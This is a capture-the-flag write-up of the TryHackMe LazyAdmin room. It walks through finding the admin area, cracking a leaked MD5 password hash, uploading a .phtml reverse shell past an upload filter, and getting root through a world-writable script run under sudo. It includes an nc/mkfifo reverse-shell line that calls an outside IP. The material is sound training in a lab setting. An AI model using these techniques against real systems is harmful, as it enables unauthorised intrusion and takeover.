---
title: "[TryHackMe] LazyAdmin - Writeup"
date: 2021-04-25T15:54:08+01:00
author: ascrivins
description: "A writeup of everything found on LazyAdmin."
ShowToc: true
ShowBreadCrumbs: true
ShowReadingTime: true
ShowPostNavLinks: true
ShowShareButtons: true
categories: ["TryHackMe"]
tags: ["Writeup", "nmap", "dirbuster", "ssh", "Privilege Escalation", "Reverse Shell", "Database"]
cover:
   image: "/post_images/lazyadmin/banner.png"
---

# Intro 
Writeup of everything found and exploited in Lazy Admin.

The room information says: "Have some fun! There might be multiple ways to get user access." So this is a writeup of everything I discovered. 

Link to room: https://tryhackme.com/room/lazyadmin

-----------------------------

# Reconnaissance  
## Scanning 
An nmap scan of the IP revealed the following information:

    └─$ nmap -sC -sV [ip]   
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 14:51 BST
    Nmap scan report for [ip]
    Host is up (0.036s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
    |   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
    |_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

SSH port on 22 and a HTTP server on 80. -Standard stuff.

----------------------------

## Dirbuster 
The HTTP server on 80 gives the default Apache2 page:

![Default Apache2 webpage](/post_images/lazyadmin/apache2.png)

Running a first round of dirbuster on this server gives the /content/ directory:

![Dirbuster Round 1](/post_images/lazyadmin/dirbuster1.png)

This gives a webpage for "SweetRice":

![SweetRice webpage](/post_images/lazyadmin/rice-homepage.png)

Running a second round of dirbuster on this /content/ directory gives up some interesting pages to look at:

![Dirbuster Round 2](/post_images/lazyadmin/dirbuster2.png)

-------------------------

## First Credentials Found
This dirbuster result gives an old SQL server file that we can download:

![old sql file](/post_images/lazyadmin/old-sql-found.png)

Taking a look at the file, we find a username and an encrypted password:

![Username and Encrypted Password](/post_images/lazyadmin/cred-found.png)

Dropping this password into hashes.com allows us to easily decrypt:

    42f749ade7f9e195bf475f37a44cafcb:[Redacted]:MD5PLAIN

-------------------------

## Webpage Admin Area
The other interesting dirbuster result is /content/as/, this gives the login for the admin area. 

![Admin Logon](/post_images/lazyadmin/admin-login.png)

We can login with the credentials found in the SQL database file and have a look around. 

One interesting thing found here is this:

![Database Credentials](/post_images/lazyadmin/database-credentials.png)

This tell us there is a database running mysql attached to the server on localhost and gives us the credentials, this might come in handy once the server has been compromised. 

----------------------------

# Exploitation 
## Shell Upload
In the media centre we get an area we can upload files. There is some file extension checking here but we can get past with a .phtml file. 

![Shell Upload](/post_images/lazyadmin/shell-upload.png)

With a netcat port listening, we can simply click on the file and perform the exploit.

    └─$ nc -lvnp 1234               
    listening on [any] 1234 ...
    connect to [my-ip] from (UNKNOWN) [ip] 59624
    Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
     17:16:39 up 26 min,  0 users,  load average: 0.00, 0.02, 0.25
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ 

We should first upgrade the shell using python:

    $ python -c 'import pty; pty.spawn("/bin/bash")'
    www-data@THM-Chal:/$ 

---------------------------

## User Flag
The user flag is then in the home directory of username: itguy

    www-data@THM-Chal:/$ cd /home
    www-data@THM-Chal:/home$ ls
    itguy
    www-data@THM-Chal:/home$ cd itguy
    www-data@THM-Chal:/home/itguy$ ls
    Desktop    Downloads  Pictures  Templates  backup.pl         mysql_login.txt
    Documents  Music      Public    Videos     examples.desktop  user.txt

-------------------------------

# Internal Reconnaissance
## Database 
The database credentials are listed again within mysql_login.txt in itguy's home directory. So my first though was to check this database for anything useful. 

    www-data@THM-Chal:/home/itguy$ mysql -u rice -p
    mysql -u rice -p
    Enter password: randompass
    
    Welcome to the MySQL monitor.  Commands end with ; or \g.
    Your MySQL connection id is 20
    Server version: 5.7.28-0ubuntu0.16.04.2 (Ubuntu)
    
    Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.
    
    Oracle is a registered trademark of Oracle Corporation and/or its
    affiliates. Other names may be trademarks of their respective
    owners.
    
    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
    
    mysql> show Databases;
    show Databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | mysql              |
    | performance_schema |
    | sys                |
    | website            |
    +--------------------+
    5 rows in set (0.00 sec)

From looking around, there is nothing interesting here so this was a dead end. 

----------------------------

## Sudo -l 
Checking the sudo privileges of www-data, we can see the commands that could be leveraged through privilege escalation:

    www-data@THM-Chal:/home/itguy$ sudo -l
    Matching Defaults entries for www-data on THM-Chal:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User www-data may run the following commands on THM-Chal:
        (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

This tells us we can run perl and a script within itguy's home directory called backup.pl.

------------------------------

# Privilege Escalation 
## backup.pl and copy.sh 
The backup script is going to run a file called copy.sh in the /etc/ folder:

    www-data@THM-Chal:/home/itguy$ cat backup.pl
    
        #!/usr/bin/perl
        
        system("sh", "/etc/copy.sh");

The permissions on this file mean we cannot edit but we can edit copy.sh:

    www-data@THM-Chal:/home/itguy$ ls -al /etc | grep "copy.sh"
    -rw-r--rwx   1 root root      81 Nov 29  2019 copy.sh

------------------------------

## Root Reverse Shell
The contents of copy.sh gives us a reverse shell that just need updating with our IP and port.

    www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

-------------------------------

## Root Shell 
More simply we can just edit copy.sh to gives us a root shell like so:

    www-data@THM-Chal:/home/itguy$ echo '/bin/sh -i' > /etc/copy.sh
    www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
    # whoami
    root
    # python -c 'import pty; pty.spawn("/bin/bash")'
    root@THM-Chal:/home/itguy# 

From here, we can read out the contents of the root flag.

    root@THM-Chal:/# cd /root
    root@THM-Chal:~# ls
    root.txt
    root@THM-Chal:~# cat root.txt
    THM{6637f[Redacted]24699f}

---------------------

# Extra Notes
## Brute Forcing SSH
Once I knew the username itguy, I did attempt to brute force his SSH password using hydra and rockyou.txt. However, this did not yield any results. 

----------------